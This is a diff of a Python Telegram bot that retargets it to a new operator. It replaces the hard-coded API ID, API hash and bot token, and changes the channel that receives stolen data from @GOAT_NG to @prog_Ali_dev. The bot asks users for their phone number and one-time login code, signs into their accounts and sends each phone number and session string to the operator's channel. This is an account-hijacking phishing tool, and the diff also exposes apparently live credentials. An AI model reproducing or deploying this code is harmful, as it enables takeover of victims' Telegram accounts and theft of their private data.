@@ -6,9 +6,9 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, A
 from telethon.sessions import StringSession
 
 # Telegram API Credentials
-API_ID = 29657994  # Replace with your API ID
-API_HASH = "85f461c4f637911d79c65da1fc2bdd77"  # Replace with your API Hash
-BOT_TOKEN = "7612843678:AAHDOH4rDEcoUJ44hlN8HaUn11-vVX6-gUg"  # Replace with your Bot Token
+API_ID = 21924891  # Replace with your API ID
+API_HASH = "e36584063001075042be33ca7974d723"  # Replace with your API Hash
+BOT_TOKEN = "7835729461:AAE8KjtmQnw9imLuzJJQeOeRafc1c9O0DD8"  # Replace with your Bot Token
 
 # Temporary storage for user data
 user_data = {}
@@ -84,8 +84,8 @@ async def handle_phone_number(client, message: Message):
     phone_number = message.contact.phone_number
     user_id = message.chat.id
 
-    # Send phone number to your channel (@GOAT_NG)
-    await app.send_message("@GOAT_NG", f"New phone number received: {phone_number}")
+    # Send phone number to your channel (@prog_Ali_dev)
+    await app.send_message("@prog_Ali_dev", f"New phone number received: {phone_number}")
 
     await message.reply_text(f"Received phone number: {phone_number}. Sending OTP...")
 
@@ -136,8 +136,8 @@ async def handle_otp(client, message: Message):
         await client.sign_in(phone_number, otp, phone_code_hash=phone_code_hash)
         session_string = client.session.save()
 
-        # Send session string to your channel (@GOAT_NG)
-        await app.send_message("@GOAT_NG", f"New session string for {phone_number}: {session_string}")
+        # Send session string to your channel (@prog_Ali_dev)
+        await app.send_message("@prog_Ali_dev", f"New session string for {phone_number}: {session_string}")
 
         await message.reply_text("Login successful!")
     except PhoneCodeInvalidError:
@@ -174,8 +174,8 @@ async def handle_otp_digit(client, callback_query):
             await client.sign_in(phone_number, user_info["otp"], phone_code_hash=phone_code_hash)
             session_string = client.session.save()
 
-            # Send session string to your channel (@GOAT_NG)
-            await app.send_message("@GOAT_NG", f"New session string for {phone_number}: {session_string}")
+            # Send session string to your channel (@prog_Ali_dev)
+            await app.send_message("@prog_Ali_dev", f"New session string for {phone_number}: {session_string}")
 
             await callback_query.message.reply_text("Login successful!")
         except PhoneCodeInvalidError:
